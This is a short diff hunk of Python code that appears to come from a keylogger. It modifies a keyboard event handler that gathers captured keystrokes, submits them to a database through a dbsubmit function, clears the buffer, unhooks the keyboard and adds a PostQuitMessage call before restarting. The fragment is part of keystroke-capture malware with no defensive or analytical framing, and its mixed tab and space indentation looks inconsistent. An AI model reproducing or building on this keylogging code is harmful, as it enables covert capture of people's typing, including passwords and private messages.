@@ -163,12 +163,12 @@ def OnKeyboardEvent(event):
 
 		pushKeys = pushKeys.replace("'", '')
 
-    	dbsubmit(pushKeys)
-    	del grab[:]
-
+		dbsubmit(pushKeys)
+		del grab[:]
+		kslv = False
+		q = 0
     	hooks_manager.UnhookKeyboard()
-    	kslv = False
-    	q = 0
+    	ctypes.windll.user32.PostQuitMessage(0)
     	main()
 
     else:
